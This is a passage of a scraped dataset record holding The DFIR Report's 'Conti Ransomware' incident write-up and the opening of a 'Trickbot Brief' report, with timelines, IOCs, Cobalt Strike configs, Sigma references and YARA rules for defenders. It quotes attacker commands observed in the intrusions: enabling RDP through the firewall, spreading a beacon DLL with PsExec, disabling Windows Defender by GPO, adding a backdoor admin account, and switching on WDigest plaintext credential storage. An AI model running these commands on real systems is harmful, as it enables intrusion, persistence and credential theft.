window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Trickbot Brief: Creds and Beacons WebLogic RCE Leads to XMRig Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "Conti Ransomware \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts cobaltstrike conti icedid ransomware Conti Ransomware May 12, 2021 Introduction First seen in May 2020, Conti ransomware has quickly become one of the most common ransomware variants, according to Coveware. As per Coveware\u2019s Quarterly Ransomware Report (Q1 2021), Conti has the 2nd highest market share after Sodinokibi, which we wrote about here . In April, we saw a threat actor go from an initial IcedID infection to deploying Conti ransomware domain wide in two days and 11 hours. The threat actors stayed dormant for most of this time, before jumping into action on an early Saturday morning. The hands on keyboard activity lasted for two and a half hours. They utilized RDP, PsExec, and Cobalt Strike to move laterally within the environment before executing Conti in memory across all active systems. Summary We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign. The JavaScript file would eventually download and execute the IcedID malware. Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors. While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity. After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID. The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe. They then successfully escalated to SYSTEM privileges via Cobalt Strike\u2019s built-in \u201cnamed pipe impersonation\u201d ( GetSystem ) functionality. The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon. During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM. After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network. Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment. This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080. To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group. Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification. Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems. Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide. The ransomware note left by the infection included a link to their Tor site for further details. After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts available from this case such as pcaps, memory captures, files, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @pigerlin , @MetallicHack , @yatinwad , and 1 unnamed contributor. Reviewed by @kostastsale , @RoxpinTeddy , and @TheDFIRReport MITRE ATT&CK Initial Access The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it. Brad had a few posts about these around the time of this intrusion. 1 2 Thanks Brad! Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values. IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion. rundll32.exe \"C:\\Users\\REDACTED\\AppData\\Local\\Temp\\rate_x32.dat\",update /i:\"LaborBetray\\license.dat\" Discovery IcedID ran initial discovery after being executed on the beachhead. Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc . ipconfig /all systeminfo whoami /groups net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all new group \"Domain Admins\" /domain Additional discovery commands were executed by Cobalt Strike. cmd.exe /C whoami /groups cmd.exe /C query session cmd.exe /C dir %HOMEDRIVE%%HOMEPATH% cmd.exe /C nltest /domain_trusts cmd.exe /C nltest /dclist: cmd.exe /C net group \"Enterprise admins\" /domain cmd.exe /C net group \"Domain admins\" /domain After moving laterally to a domain controller, they began looking for what networks were present in the environment using dsquery . cmd.exe /C dsquery subnet -limit 0 Shortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.) on systems residing in the same subnet. Privilege Escalation In order to obtain SYSTEM level privileges, Cobalt Strike\u2019s built-in named piped impersonation (GetSystem) was used: Image : \u201cC:\\Windows\\System32\\cmd.exe\u201d CommandLine : \u201cC:\\Windows\\system32\\cmd.exe /c echo 4d64fbbbf34 > \\\\.\\pipe\\b4312c\u201d ParentImage : \u201cC:\\Windows\\System32\\runonce.exe\u201d ParentCommandLine : \u201cC:\\Windows\\system32\\runonce.exe\" Lateral Movement The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries. Image: C:\\Windows\\system32\\services.exe TargetObject: HKLM\\System\\CurrentControlSet\\Services\\d8d6deb\\ImagePath Details: \\\\HOSTNAME\\ADMIN$\\d8d6deb.exe After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers. cmd.exe /C reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f cmd.exe /C netsh firewall set service type = remotedesktop mode = enable cmd.exe /C netsh firewall set rule group=\"remote desktop\" new enable=Yes cmd.exe /C netsh advfirewall set rule group=\"remote desktop\" new enable=Yes Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec . cmd.exe /C copy 192145.dll \\\\<INTERNAL_IP>\\ADMIN$ /Y /Z psexec.exe -accepteula -d -s \\\\<INTERNAL_IP> rundll32.exe C:\\windows\\192145.dll,StartW From here, RDP connections were established from the beachhead host to systems throughout the environment. The connections were proxied through the IcedID process. The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process. The below traffic shows more details of the RDP session, including the username in the cookie. This proxied traffic reported back the hostname of the threat actors machine as \u201cmikespc\u201d. We\u2019re looking for you Mike! \ud83d\ude09 Defense Evasion To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO. They then force updated the GPO on all clients using Cobalt Strike. ParentCommandLine CommandLine C:\\Windows\\System32\\dllhost.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force C:\\Users\\USER\\AppData\\Local\\Temp\\icju1.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force C:\\Windows\\System32\\dllhost.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force \u201crundll32.exe\u201d c:\\windows\\192145.dll,StartW C:\\Windows\\system32\\cmd.exe /C gpupdate /force Registry Keys Action HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableRealtimeMonitoring DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableBehaviorMonitoring DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableIntrusionPreventionSystem DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection DeleteKey In addition, other security services were stopped or uninstalled. NET STOP \"redacted\" EventID : 13 Description : RegistryEvent (Value Set) TargetObject : HKLM\\System\\CurrentControlSet\\Services\\<redacted>\\Start Value : DWORD (0x00000004) Command and Control IcedID 68.183.20[.]194:80 vaclicinni[.]xyz 83.97.20[.]160:443 oxythuler[.]cyou expertulthima[.]club dictorecovery[.]cyou thulleultinn[.]club Key identifier: 82:92:07:FD:86:23:FE:26:0E:4A:42:5A:F7:C7:70:2A:45:4E:01:5B Not Before: Apr 22 15:27:02 2021 GMT Not After : Apr 22 15:27:02 2022 GMT CommonName: localhost City= AU State= Some-State Org = Internet Widgits Pty Ltd ja3: a0e9f5d64349fb13191bc781f81f42e1 ja3s: ec74a5c51106f0419184d0dd08fb05bc 159.89.140[.]116:443 oxythuler[.]cyou thulleultinn[.]club Key Identifier: A4:EB:95:C2:04:91:E3:AF:67:7C:5D:B3:CB:DB:E3:38:90:5E:A7:68 Not Before: Apr 13 14:59:41 2021 GMT Not After : Apr 13 14:59:41 2022 GMT CommonName: localhost City= AU State= Some-State Org = Internet Widgits Pty Ltd ja3: a0e9f5d64349fb13191bc781f81f42e1 ja3s: ec74a5c51106f0419184d0dd08fb05bc Cobalt Strike 192.99.178[.]145:80 dimentos[.]com Config: Port 443: \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce[.]exe\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce[.]exe\", \"Jitter\": 39, \"Method 2\": \"POST\", \"Port\": 443, \"Beacon Type\": \"8 (HTTPS)\", \"Polling\": 62719, \"HTTP Method Path 2\": \"/btn_bg\", \"Method 1\": \"GET\", \"C2 Server\": \"dimentos[.]com,/FAQ\" \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce[.]exe\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce[.]exe\", \"Jitter\": 39, \"Method 2\": \"POST\", \"Port\": 443, \"Beacon Type\": \"8 (HTTPS)\", \"Polling\": 62719, \"HTTP Method Path 2\": \"/btn_bg\", \"Method 1\": \"GET\", \"C2 Server\": \"dimentos[.]com,/bg\" Port 80: \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce[.]exe\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce[.]exe\", \"Jitter\": 39, \"Method 2\": \"POST\", \"Port\": 80, \"Beacon Type\": \"0 (HTTP)\", \"Polling\": 62719, \"HTTP Method Path 2\": \"/btn_bg\", \"Method 1\": \"GET\", \"C2 Server\": \"192[.]99[.]178[.]145,/r-arrow\" \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce[.]exe\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce[.]exe\", \"Jitter\": 39, \"Method 2\": \"POST\", \"Port\": 80, \"Beacon Type\": \"0 (HTTP)\", \"Polling\": 62719, \"HTTP Method Path 2\": \"/btn_bg\", \"Method 1\": \"GET\", \"C2 Server\": \"192[.]99[.]178[.]145,/bg\" Machine beaconing out to Cobalt Strike using the above profile Persistence An account named \u201cnuuser\u201d was created by one of the Cobalt Strike Beacons. As these commands were run on a domain controller, it essentially added the account to the Built-in Administrators domain group, granting it administrative privileges in the AD domain. net user /add /Y nuuser 7HeC00l3stP@ssw0rd net localgroup administrators nuuser /add Credential Access LSASS was accessed by an unusual process \u201crunonce.exe\u201d on multiple hosts, including a domain controller. EventID : 10 Description : Process Access SourceImage : \u201cC:\\Windows\\System32\\runonce.exe\u201d TargetImage : \u201cC:\\Windows\\system32\\lsass.exe\u201d SourceImage: C:\\Windows\\system32\\runonce.exe\" TargetImage: \"C:\\Windows\\system32\\lsass.exe\" GrantedAccess: 0x1010 CallTrace: \"C:\\Windows\\SYSTEM32\\ntdll.dll+9c584|C:\\Windows\\System32\\KERNELBASE.dll+2730e|UNKNOWN(0000028A62BDC798)\" The overpass-the hash technique was used to acquire a valid Kerberos ticket for the administrator user. Impact About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory. Conti deployments using a DLL seem to have first started showing up in December 2020. First time that I see #Conti ransomware spread as a DLL : Hash : 5c278c04bb19196dc8559d45b9728b3ba0c1bc5cdd20a766f56248e561c6f5a6 Pdb : A:sourceconti_v3x64Releasecryptor_dll.pdb (cc @GrujaRS @malwrhunterteam ) pic.twitter.com/gH3uCpVMpB \u2014 The Brofessor (@Glacius_) December 8, 2020 Some traces of this particular DLL were found in the memory dump taken from one of the compromised systems. We were unable to reconstruct the DLL from memory but Maxime Thiebaut (@0xThiebaut) from NVISO helped us out. The Yara rule, located in the detections section below was made possible due to him reconstructing the DLL. Thanks Maxime! Conti scans the network for 445/SMB, looking for machines to encrypt. Ransom note Which leads you here. The threat actors asked for 150k and could have been talked down at least ~20%. Multiple machines within the environment were not usable after being ransomed including a domain controller. The machines were left like this and you were not able to do anything but press control+alt+delete. Paying the ransom will not help you here. Pivots While researching the infrastructure related to this campaign, we found the threat actor revealed further infrastructure. The domain associated with the Cobalt Strike C2 (dimentos[.]com) has an unredacted Whois record that reveals several other domains also registered by the address pokix19891[@]kindbest[.]com. You\u2019ll notice the fake address and fake phone number as well. All the domains were registered on 2021-03-30, and according to public data available in VirusTotal, three of them have been associated with Cobalt Strike infrastructure so far; the domain seen in this intrusion, powelin[.]com and awesents[.]com. The two other domains (jocinet[.]com, ilimennt[.]com) have subdomains that look like name servers (ns1 and ns2), which were pointed to two of the Cobalt Strike hosting IP\u2019s. All of this infrastructure was hosted on the VPS provider OVH. IOCs Files b52c0640957e5032b5160578f8cb99f9b066fde4f9431ee6869b2eea67338f28.dll.exe b52c0640957e5032b5160578f8cb99f9b066fde4f9431ee6869b2eea67338f28 icju1.exe e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06 rate_x32.dat eb79168391e64160883b1b3839ed4045b4fd40da14d6eec5a93cfa9365503586 192145.dll f29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9 Network IcedID vaclicinni[.]xyz thulleultinn[.]club oxythuler[.]cyou dictorecovery[.]cyou expertulthima[.]club 68.183.20[.]194:80 159.89.140[.]116:443 83.97.20[.]160:443 Cobalt Strike dimentos[.]com 192.99.178[.]145:80 Proxy 38.135.122[.]194:8080 Detections Suricata ET MALWARE Win32/IcedID Requesting Encoded Binary M4 ET MALWARE W32/ Photoloader.Downloader Request Cookie ET POLICY PE EXE or DLL Windows file download HTTP ET INFO Executable Retrieved With Minimal HTTP Headers \u2013 Potential Second Stage Download ET INFO Packed Executable Download ET POLICY OpenSSL Demo CA \u2013 Internet Widgits Pty ATTACK [ PTsecurity ] Overpass the hash. Encryption downgrade activity to ARCFOUR-HMAC-MD5 ET SCAN Behavioral Unusual Port 135 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 1434 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 1435 traffic Potential Scan or Infection Sigma https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/other/win_defender_disabled.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/other/win_tool_psexec.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/sysmon_in_memory_assembly_execution.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/sysmon_rundll32_net_connections.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_net_user_add.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_psexesvc_start.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_psexec_eula.yml Sigma Rule Converter for SIEMs and EDRs: https://uncoder.io/ YARA /* YARA Rule Set Author: The DFIR Report Date: 2021-05-09 Identifier: 3584 Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule icedid_rate_x32 { meta: description = \"files - file rate_x32.dat\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"eb79168391e64160883b1b3839ed4045b4fd40da14d6eec5a93cfa9365503586\" strings: $s1 = \"UAWAVAUATVWSH\" fullword ascii $s2 = \"UAWAVVWSPH\" fullword ascii $s3 = \"AWAVAUATVWUSH\" fullword ascii $s4 = \"update\" fullword ascii /* Goodware String - occured 207 times */ $s5 = \"?klopW@@YAHXZ\" fullword ascii $s6 = \"?jutre@@YAHXZ\" fullword ascii $s7 = \"PluginInit\" fullword ascii $s8 = \"[]_^A\\\\A]A^A_\" fullword ascii $s9 = \"e8[_^A\\\\A]A^A_]\" fullword ascii $s10 = \"[_^A\\\\A]A^A_]\" fullword ascii $s11 = \"Kts=R,4iu\" fullword ascii $s12 = \"mqr55c\" fullword ascii $s13 = \"R,4i=Bj\" fullword ascii $s14 = \"Ktw=R,4iu\" fullword ascii $s15 = \"Ktu=R,4iu\" fullword ascii $s16 = \"Kt{=R,4iu\" fullword ascii $s17 = \"KVL.Mp\" fullword ascii $s18 = \"Kt|=R,4iu\" fullword ascii $s19 = \"=8c[Vt8=\" fullword ascii $s20 = \"Ktx=R,4iu\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 700KB and ( pe.imphash() == \"15787e97e92f1f138de37f6f972eb43c\" and ( pe.exports(\"?jutre@@YAHXZ\") and pe.exports(\"?klopW@@YAHXZ\") and pe.exports(\"PluginInit\") and pe.exports(\"update\") ) or 8 of them ) } rule conti_cobaltstrike_192145 { meta: description = \"files - file 192145.dll\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9\" strings: $x1 = \"cmd.exe /c echo NGAtoDgLpvgJwPLEPFdj>\\\"%s\\\"&exit\" fullword ascii $s2 = \"veniamatquiest90.dll\" fullword ascii $s3 = \"Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum\" fullword ascii $s4 = \"Quaerat tempora culpa provident\" fullword ascii $s5 = \"Velit consequuntur quisquam tempora error\" fullword ascii $s6 = \"Quo omnis repellat ut expedita temporibus eius fuga error\" fullword ascii $s7 = \"Dolores ullam tempora error distinctio ut natus facere quibusdam\" fullword ascii $s8 = \"Corporis minima omnis qui est temporibus sint quo error magnam\" fullword ascii $s9 = \"Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit\" fullword ascii $s10 = \"Rerum tenetur sapiente est tempora qui deserunt\" fullword ascii $s11 = \"Sed nulla quaerat porro error excepturi\" fullword ascii $s12 = \"Aut tempore quo cumque dicta ut quia in\" fullword ascii $s13 = \"Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut\" fullword ascii $s14 = \"Tempore possimus aperiam nam mollitia illum hic at ut doloremque\" fullword ascii $s15 = \"Dolorum eum ipsum tempora non et\" fullword ascii $s16 = \"Quas alias illum laborum tempora sit est rerum temporibus dicta et\" fullword ascii $s17 = \"Et quia aut temporibus enim repellat dolores totam recusandae repudiandae\" fullword ascii $s18 = \"Sed velit ipsa et dolor tempore sunt nostrum\" fullword ascii $s19 = \"Veniam voluptatem aliquam et eaque tempore tenetur possimus\" fullword ascii $s20 = \"Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 2000KB and ( pe.imphash() == \"5cf3cdfe8585c01d2673249153057181\" and pe.exports(\"StartW\") or ( 1 of ($x*) or 4 of them ) ) } rule conti_cobaltstrike_icju1 { meta: description = \"files - file icju1.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06\" strings: $x1 = \"cmd.exe /c echo NGAtoDgLpvgJwPLEPFdj>\\\"%s\\\"&exit\" fullword ascii $s2 = \"veniamatquiest90.dll\" fullword ascii $s3 = \"Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum\" fullword ascii $s4 = \"Quaerat tempora culpa provident\" fullword ascii $s5 = \"Velit consequuntur quisquam tempora error\" fullword ascii $s6 = \"Quo omnis repellat ut expedita temporibus eius fuga error\" fullword ascii $s7 = \"Dolores ullam tempora error distinctio ut natus facere quibusdam\" fullword ascii $s8 = \"Corporis minima omnis qui est temporibus sint quo error magnam\" fullword ascii $s9 = \"Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit\" fullword ascii $s10 = \"Rerum tenetur sapiente est tempora qui deserunt\" fullword ascii $s11 = \"Sed nulla quaerat porro error excepturi\" fullword ascii $s12 = \"Aut tempore quo cumque dicta ut quia in\" fullword ascii $s13 = \"Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut\" fullword ascii $s14 = \"Tempore possimus aperiam nam mollitia illum hic at ut doloremque\" fullword ascii $s15 = \"Dolorum eum ipsum tempora non et\" fullword ascii $s16 = \"Quas alias illum laborum tempora sit est rerum temporibus dicta et\" fullword ascii $s17 = \"Et quia aut temporibus enim repellat dolores totam recusandae repudiandae\" fullword ascii $s18 = \"Sed velit ipsa et dolor tempore sunt nostrum\" fullword ascii $s19 = \"Veniam voluptatem aliquam et eaque tempore tenetur possimus\" fullword ascii $s20 = \"Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 2000KB and ( pe.imphash() == \"a6d9b7f182ef1cfe180f692d89ecc759\" or ( 1 of ($x*) or 4 of them ) ) } rule conti_v3 { meta: description = \"conti_yara - file conti_v3.dll\" author = \"pigerlin\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"8391dc3e087a5cecba74a638d50b771915831340ae3e027f0bb8217ad7ba4682\" strings: $s1 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii $s2 = \"conti_v3.dll\" fullword ascii $s3 = \" <requestedExecutionLevel level='asInvoker' uiAccess='false' />\" fullword ascii $s4 = \" Type Descriptor'\" fullword ascii $s5 = \"operator co_await\" fullword ascii $s6 = \" <trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\">\" fullword ascii $s7 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide $s8 = \" Base Class Descriptor at (\" fullword ascii $s9 = \" Class Hierarchy Descriptor'\" fullword ascii $s10 = \" Complete Object Locator'\" fullword ascii $s11 = \" delete[]\" fullword ascii $s12 = \" </trustInfo>\" fullword ascii $s13 = \"__swift_1\" fullword ascii $s15 = \"__swift_2\" fullword ascii $s19 = \" delete\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 700KB and all of them } rule conti_cobaltstrike_192145_icju1_0 { meta: description = \"files - from files 192145.dll, icju1.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-05-09\" hash1 = \"29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9\" hash2 = \"e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06\" strings: $x1 = \"cmd.exe /c echo NGAtoDgLpvgJwPLEPFdj>\\\"%s\\\"&exit\" fullword ascii $s2 = \"veniamatquiest90.dll\" fullword ascii $s3 = \"Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum\" fullword ascii $s4 = \"Quaerat tempora culpa provident\" fullword ascii $s5 = \"Dolores ullam tempora error distinctio ut natus facere quibusdam\" fullword ascii $s6 = \"Velit consequuntur quisquam tempora error\" fullword ascii $s7 = \"Corporis minima omnis qui est temporibus sint quo error magnam\" fullword ascii $s8 = \"Quo omnis repellat ut expedita temporibus eius fuga error\" fullword ascii $s9 = \"Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit\" fullword ascii $s10 = \"Rerum tenetur sapiente est tempora qui deserunt\" fullword ascii $s11 = \"Sed nulla quaerat porro error excepturi\" fullword ascii $s12 = \"Aut tempore quo cumque dicta ut quia in\" fullword ascii $s13 = \"Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut\" fullword ascii $s14 = \"Tempore possimus aperiam nam mollitia illum hic at ut doloremque\" fullword ascii $s15 = \"Et quia aut temporibus enim repellat dolores totam recusandae repudiandae\" fullword ascii $s16 = \"Dolorum eum ipsum tempora non et\" fullword ascii $s17 = \"Quas alias illum laborum tempora sit est rerum temporibus dicta et\" fullword ascii $s18 = \"Sed velit ipsa et dolor tempore sunt nostrum\" fullword ascii $s19 = \"Veniam voluptatem aliquam et eaque tempore tenetur possimus\" fullword ascii $s20 = \"Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium\" fullword ascii condition: ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them ) } MITRE: Command and Scripting Interpreter \u2013 T1059 External Proxy \u2013 T1090.002 Remote Desktop Protocol \u2013 T1021.001 OS Credential Dumping \u2013 T1003 Pass the Hash \u2013 T1550.002 Service Execution \u2013 T1569.002 SMB/Windows Admin Shares \u2013 T1021.002 Data Encrypted for Impact \u2013 T1486 System Owner/User Discovery \u2013 T1033 Permission Groups Discovery \u2013 T1069 Application Layer Protocol \u2013 T1071 Process Injection \u2013 T1055 Group Policy Modification \u2013 T1484 Access Token Manipulation \u2013 T1134 Create Account \u2013 T1136 Remote System Discovery \u2013 T1018 Network Service Scanning \u2013 T1046 Domain Account \u2013 T1087.002 Impair Defenses \u2013 T1562 Internal case: 3584 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Trickbot Brief: Creds and Beacons WebLogic RCE Leads to XMRig Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 1
  },
  {
    "url": "https://thedfirreport.com/2021/05/02/trickbot-brief-creds-and-beacons/",
    "title": "Trickbot Brief: Creds and Beacons \u2013 The DFIR Report",
    "content": "Trickbot Brief: Creds and Beacons \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts trickbot Trickbot Brief: Creds and Beacons May 2, 2021 Intro \u201cTrickBot malware\u2014first identified in 2016\u2014is a Trojan developed and operated by a sophisticated group of cybercrime actors. The cybercrime group initially designed TrickBot as a banking trojan to steal financial data. Through continued development and new functionality, TrickBot has become a highly modular, multi-stage malware that provides its operators a full suite of tools to conduct a myriad of illegal cyber activities. Since TrickBot\u2019s inception, the cybercrime group has used the malware to attack individuals and businesses globally across a wide range of sectors.\u201d Source \u2013 Fact Sheet: TrickBot Malware Source In an intrusion this past month, threat actors were seen enumerating and collecting information related to the domain as well as dumping passwords before leaving the network. Multiple Cobalt Strike Beacons were deployed and remained connected despite the lack of activity from the threat actors. Case Summary We assess, with moderate confidence, the Trickbot DLL that we executed was originally delivered via a malicious Office document. The threat actors were observed leveraging Trickbot and Cobalt Strike for C2 communication. They began their discovery by running net and nltest commands as well as PowerView domain discovery modules. Minutes later, Lazagne (\u201cretrieve lots of passwords\u201d) was executed using the \u201call\u201d switch . A registry value was set to enable storing logon credentials in plaintext in memory (WDigest), likely to facilitate future activity as the host was not restarted for this change to take effect. Before the threat actors departed the network, they successfully accessed the LSASS process and retrieved credentials from memory. No lateral movement or execution on mission was observed. Timeline Analysis and reporting completed by @kostastsale , @ICSNick , and @RoxpinTeddy . Reviewed by @TheDFIRReport MITRE ATT&CK Initial Access We assess with moderate confidence that this DLL was dropped by a malicious Office document. Execution Trickbot (click.php.dll) was manually executed on a single endpoint. Source : https://tria.ge/210412-wmdnkzp5la Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon. Reviewing the above PowerShell code, we can extract the shellcode to discover the IP and User-agent string, the beacon will communicate with. Getting the IP and port using scdbg . The threat actor also executed a second Cobalt Strike Beacon ( wsuC3C.tmp) using the injected wermgr .exe process. rundll32.exe C:\\Users\\redacted\\AppData\\Local\\Temp\\wsuC3C.tmp,ControlUnitSpeed Persistence A scheduled task was created to keep the Trickbot malware persistent on the system. C:\\Windows\\system32\\rundll32.exe\" \"C:\\Users\\redacted\\AppData\\Roaming\\DownloadMngNet5353711913\\xxclickdr.dwn\",#1 Defense Evasion Trickbot injected into wermgr.exe processes and used this for communication to command and control infrastructure. Credential Access Lazagne was used with the \u201call\u201d switch, which runs all modules. Below we can see registry hives being saved to disk. LSASS was accessed by rundll32, but we did not see anything written to disk. Trickbot was used to enable the storage of clear text credentials (WDigest) by setting UseLogonCredential to 1. Key - SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest Value name - UseLogonCredential Set value data - 1 Discovery The following net commands were used by the threat actor from the injected Trickbot process. net config workstation net view /all net view /all /domain net group \u201cDomain Computers\u201d /domain The following nltest commands were used by the threat actor from the injected 